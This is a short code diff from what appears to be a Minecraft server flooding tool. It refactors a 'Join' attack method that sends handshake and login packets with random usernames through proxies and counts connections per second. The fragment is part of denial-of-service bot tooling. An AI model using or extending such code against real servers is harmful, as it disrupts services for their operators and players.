@@ -1,6 +1,7 @@
 package dev.lastknell.core.methods.impl;
 
 import dev.lastknell.core.config.AttackConfig;
+import dev.lastknell.core.manager.ConnectionsInfo;
 import dev.lastknell.core.methods.iAttackMethod;
 import dev.lastknell.core.packets.Handshake;
 import dev.lastknell.core.packets.LoginRequest;
@@ -14,16 +15,18 @@ public class Join implements iAttackMethod {
     private final AttackConfig config;
     private final byte[] handshake;
     private final boolean useNew;
+    private final ConnectionsInfo info;
 
-    public Join(AttackConfig config) {
+    public Join(AttackConfig config, ConnectionsInfo info) {
         this.config = config;
         useNew = config.protocolID > 758;
         handshake = Handshake.getWrappedPacket(config.protocolID, config.srvIp, config.port, 2);
+        this.info = info;
     }
 
     @Override
     public void accept(Channel channel, Proxy proxy) {
-        config.cpsinfo.openedCPS++;
+        info.openedCPS++;
         channel.writeAndFlush(Unpooled.buffer().writeBytes(handshake));
         if(useNew) {
             channel.writeAndFlush(Unpooled.buffer().writeBytes(
@@ -32,7 +35,7 @@ public class Join implements iAttackMethod {
             channel.writeAndFlush(Unpooled.buffer().writeBytes(
                     LoginRequest.getWrappedPacket(RandomUtils.randomString(12))));
         }
-        config.cpsinfo.successfulCPS++;
+        info.successfulCPS++;
     }
 
     @Override
